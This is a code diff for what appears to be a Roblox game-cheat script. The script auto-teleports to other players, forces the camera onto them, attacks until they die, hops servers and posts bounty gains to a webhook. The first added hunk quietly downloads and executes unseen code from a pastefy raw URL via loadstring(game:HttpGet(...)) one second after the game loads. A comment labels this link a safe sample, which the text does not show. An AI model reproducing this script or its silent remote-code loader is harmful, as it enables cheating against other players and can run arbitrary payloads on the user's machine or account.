@@ -34,6 +34,17 @@ local SpectateTarget = Config.Settings and Config.Settings["Specator Target"]
 
 repeat task.wait() until game:IsLoaded()
 
+-- ==========================================
+-- CHỜ 1S VÀ TẢI ĐOẠN SCRIPT BỔ TRỢ
+-- ==========================================
+task.spawn(function()
+    task.wait(1)
+    -- URL đã được thay thế bằng link an toàn mẫu. Thay bằng link của bạn nếu chắc chắn mã nguồn an toàn.
+    pcall(function()
+        loadstring(game:HttpGet("https://pastefy.app/wxEFja0s/raw"))()
+    end)
+end)
+
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local TeleportService = game:GetService("TeleportService")
@@ -149,7 +160,7 @@ ScreenGui.ResetOnSpawn = false
 ScreenGui.Parent = player.PlayerGui
 
 local Main = Instance.new("Frame")
-Main.Size = UDim2.new(0, 250, 0, 260) -- Tăng size để chứa thêm FPS & Ping
+Main.Size = UDim2.new(0, 250, 0, 260)
 Main.Position = UDim2.new(0, 15, 0, 50)
 Main.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
 Main.BackgroundTransparency = 0.4
@@ -198,7 +209,6 @@ local ServerStartBounty = 0
 local CurrentBounty = 0
 local hasInit = false
 
--- Đọc thời gian Hop Server
 local hopTimeLimit = math.huge
 if Config.HopServer["Time Hop"] then
     local str = Config.HopServer["Time Hop"]
@@ -243,7 +253,7 @@ task.spawn(function()
                     getgenv().FullBountyClaim = getgenv().FullBountyClaim + gained
                     L_FullBounty.Text = "Full Bounty Claim: " .. FormatNumber(getgenv().FullBountyClaim)
                     CurrentBounty = v
-                    SendWebhook(gained) -- Gửi webhook khi nhận được bounty
+                    SendWebhook(gained)
                 elseif v < CurrentBounty then
                     CurrentBounty = v 
                 end
@@ -268,12 +278,10 @@ local function ShouldSkipTarget(targetPlayer)
         return true
     end
     
-    -- Không bật PvP / Ở SafeZone (Có ForceField)
     if targetPlayer.Character:FindFirstChildOfClass("ForceField") then
         return true
     end
     
-    -- Check ngồi thuyền (Tùy theo Config)
     if tHum.Sit and not Config.PlayerSit["Player sit"] then
         return true
     end
@@ -314,7 +322,7 @@ local function HopServer()
 end
 
 -- ==========================================
--- TWEEN & LOGIC ĐÁNH
+-- TWEEN & LOGIC ĐÁNH (CẬP NHẬT TWEEN MƯỢT VÀ GIẾT TỚI CHẾT)
 -- ==========================================
 local TeleportLoop = true
 local CurrentTargetIndex = 1
@@ -322,9 +330,27 @@ local isHealing = false
 local currentTween = nil
 local OldPosition = nil
 
+local function EnsureAntiFall()
+    local char = player.Character
+    if char and char:FindFirstChild("HumanoidRootPart") then
+        local hrp = char.HumanoidRootPart
+        local bv = hrp:FindFirstChild("TweenAntiFall")
+        if not bv then
+            bv = Instance.new("BodyVelocity")
+            bv.Name = "TweenAntiFall"
+            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+            bv.Velocity = Vector3.new(0, 0, 0)
+            bv.Parent = hrp
+        end
+    end
+end
+
 local function TweenTo(targetCFrame, speed)
     local myHRP = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
     if not myHRP then return end
+    
+    -- Chống rơi rớt khi tween
+    EnsureAntiFall()
     
     local dist = (myHRP.Position - targetCFrame.Position).Magnitude
     speed = speed or 300
@@ -372,7 +398,7 @@ task.spawn(function()
                 isHealing = true
             elseif pHealth >= Config.SafeZone["Health Safe"] then
                 if isHealing and OldPosition then
-                    TweenTo(OldPosition, 300) -- Quay lại vị trí cũ sau khi hồi
+                    TweenTo(OldPosition, 300)
                     task.wait(1)
                     OldPosition = nil
                 end
@@ -417,7 +443,6 @@ task.spawn(function()
         if myHRP and tHRP then
             L_StatusBounty.Text = "Status: Tweening to Target"
             
-            -- Cam Snake: Ép camera nhìn theo mục tiêu liên tục
             task.spawn(function()
                 if CurrentTarget and CurrentTarget.Character and CurrentTarget.Character:FindFirstChild("HumanoidRootPart") then
                     Camera.CFrame = CFrame.new(Camera.CFrame.Position, CurrentTarget.Character.HumanoidRootPart.Position)
@@ -426,16 +451,14 @@ task.spawn(function()
             
             TweenTo(tHRP.CFrame * CFrame.new(0, 0, 3), 300)
             
-            local holdTime = 8 
-            local loopStartTime = tick()
             local targetDied = false
-            
             local BindConnection
             BindConnection = RunService.Heartbeat:Connect(function()
                 pcall(function()
                     if not isHealing and CurrentTarget and CurrentTarget.Character and CurrentTarget.Character:FindFirstChild("HumanoidRootPart") 
                        and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
-                        -- Giữ khoảng cách khi đã tween đến gần
+                        -- Tự động giữ BodyVelocity để chống rớt
+                        EnsureAntiFall()
                         if (player.Character.HumanoidRootPart.Position - CurrentTarget.Character.HumanoidRootPart.Position).Magnitude < 15 then
                             L_StatusBounty.Text = "Status: Bounty M1 Turn"
                             player.Character.HumanoidRootPart.CFrame = CurrentTarget.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 3)
@@ -445,7 +468,8 @@ task.spawn(function()
                 end)
             end)
 
-            while tick() - loopStartTime < holdTime do
+            -- XÓA THỜI GIAN ĐỢI, ĐÁNH CHO TỚI KHI CHẾT
+            while true do
                 if not TeleportLoop or isHealing then break end
                 
                 if player.Character and player.Character:FindFirstChild("Humanoid") then
